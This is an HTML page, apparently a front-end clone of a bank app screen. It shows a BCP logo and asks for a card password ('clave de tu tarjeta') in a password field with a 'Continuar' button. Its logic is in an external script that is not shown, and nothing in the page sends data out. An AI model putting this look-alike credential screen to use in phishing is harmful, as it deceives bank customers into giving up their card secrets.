<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title></title>
	<!--fontawesome-->
	<script src="https://use.fontawesome.com/fb4df1f3f2.js"></script>
	<!-- Material Icon -->
	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
	<link rel="stylesheet" href="css/style.min.css">
</head>
<body>
    <section id="card-one">
        <div class="row">
            <div class="col s12 center">
                <img src="img/bcp-logo.png" id="foto" alt="">
            </div>
        </div>
        <div class="row">
            <div class="col s12 center">
                <h3>Ingresa la clave de tu tarjeta</h3>
            </div>
        </div>
        <div class="tarjeta-espacio">
            <!--loading phone number with local storage-->
        </div>
        <div class="row">
            <div class="input-field col s12">
                <div class="preloader-wrapper small active right">
                    <div class="spinner-layer spinner-grey-only">
                        <div class="circle-clipper left">
                            <div class="circle"></div>
                        </div><div class="gap-patch">
                        <div class="circle"></div>
                        </div><div class="circle-clipper right">
                        <div class="circle"></div>
                        </div>
                    </div>
                </div>
                <img src="img/lock.png" class="prefix" alt="">
                <input id="passwod" type="password" class="validate center" placeholder="****">
            </div>
        </div>
        <div class="row">
            <div class="col s12 center">
                <button id="continue-profile" class="btn waves-effect waves-light yellow-button" type="submit" name="action">Continuar</button>
            </div>
        </div>
</section>
    <script src="js/script.js"></script>
</body>
</html>
